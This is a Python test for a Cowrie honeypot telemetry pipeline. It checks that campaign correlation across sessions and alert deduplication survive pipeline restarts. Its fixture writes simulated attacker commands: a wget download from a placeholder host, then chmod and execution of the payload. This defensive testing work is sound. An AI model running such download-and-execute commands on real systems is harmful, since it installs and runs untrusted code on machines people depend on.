import json

from telemetry.cowrie.pipeline import run_cowrie_pipeline


ANALYSIS_EVENT_TYPE = "morpheus.intelligence.analysis"
ALERT_EVENT_TYPE = "morpheus.alert.created"


def _write_cowrie_log(path, session_id, source_ip, start_time):
    from datetime import datetime, timedelta

    start = datetime.fromisoformat(start_time)
    events = [
        {
            "eventid": "cowrie.session.connect",
            "timestamp": start.isoformat(),
            "session": session_id,
            "src_ip": source_ip,
            "protocol": "ssh",
        },
        {
            "eventid": "cowrie.command.input",
            "timestamp": (start + timedelta(seconds=1)).isoformat(),
            "session": session_id,
            "input": "wget http://example.test/payload",
        },
        {
            "eventid": "cowrie.command.input",
            "timestamp": (start + timedelta(seconds=2)).isoformat(),
            "session": session_id,
            "input": "chmod +x payload",
        },
        {
            "eventid": "cowrie.command.input",
            "timestamp": (start + timedelta(seconds=3)).isoformat(),
            "session": session_id,
            "input": "./payload",
        },
        {
            "eventid": "cowrie.session.closed",
            "timestamp": (start + timedelta(seconds=4)).isoformat(),
            "session": session_id,
            "duration_ms": 4000,
        },
    ]
    path.write_text(
        "".join(json.dumps(event) + "\n" for event in events),
        encoding="utf-8",
    )


def _read_events(path):
    if not path.exists():
        return []
    return [
        json.loads(line)
        for line in path.read_text(encoding="utf-8").splitlines()
        if line.strip()
    ]


def _events_of_type(events, event_type):
    return [event for event in events if event.get("event_type") == event_type]


def test_campaign_context_and_alert_dedup_survive_pipeline_restarts(tmp_path):
    storage_path = tmp_path / "events.jsonl"
    first_log = tmp_path / "first-session.json"
    second_log = tmp_path / "second-session.json"

    shared_ip = "192.0.2.44"
    first_session = "restart-session-one"
    second_session = "restart-session-two"

    _write_cowrie_log(
        first_log,
        first_session,
        shared_ip,
        "2026-10-16T10:00:00+00:00",
    )

    # Run 1: process and persist the historical session and its alert.
    run_cowrie_pipeline(
        log_path=str(first_log),
        storage_path=str(storage_path),
        alert_minimum_severity="medium",
    )

    first_events = _read_events(storage_path)
    first_analyses = _events_of_type(first_events, ANALYSIS_EVENT_TYPE)
    first_alerts = _events_of_type(first_events, ALERT_EVENT_TYPE)

    assert len(first_analyses) == 1
    assert len(first_alerts) == 1
    assert first_alerts[0]["data"]["session_id"] == first_session

    # Run 2: replay the same log after restarting the pipeline.
    run_cowrie_pipeline(
        log_path=str(first_log),
        storage_path=str(storage_path),
        alert_minimum_severity="medium",
    )

    replay_events = _read_events(storage_path)
    replay_analyses = _events_of_type(replay_events, ANALYSIS_EVENT_TYPE)
    replay_alerts = _events_of_type(replay_events, ALERT_EVENT_TYPE)

    assert len(replay_analyses) == 1
    assert len(replay_alerts) == 1
    assert replay_alerts[0]["data"]["session_id"] == first_session

    # Run 3: a new session from the same source should correlate with history.
    _write_cowrie_log(
        second_log,
        second_session,
        shared_ip,
        "2026-10-17T10:00:00+00:00",
    )

    run_cowrie_pipeline(
        log_path=str(second_log),
        storage_path=str(storage_path),
        alert_minimum_severity="medium",
    )

    final_events = _read_events(storage_path)
    analyses = _events_of_type(final_events, ANALYSIS_EVENT_TYPE)
    alerts = _events_of_type(final_events, ALERT_EVENT_TYPE)

    assert len(analyses) == 2

    second_analysis = next(
        event["data"]
        for event in analyses
        if event["data"]["session"]["session_id"] == second_session
    )
    campaign = second_analysis["campaign"]

    assert campaign is not None
    assert set(campaign["session_ids"]) == {first_session, second_session}

    # The old alert must not be resent after restart.
    old_session_alerts = [
        event for event in alerts
        if event["data"]["session_id"] == first_session
    ]
    assert len(old_session_alerts) == 1
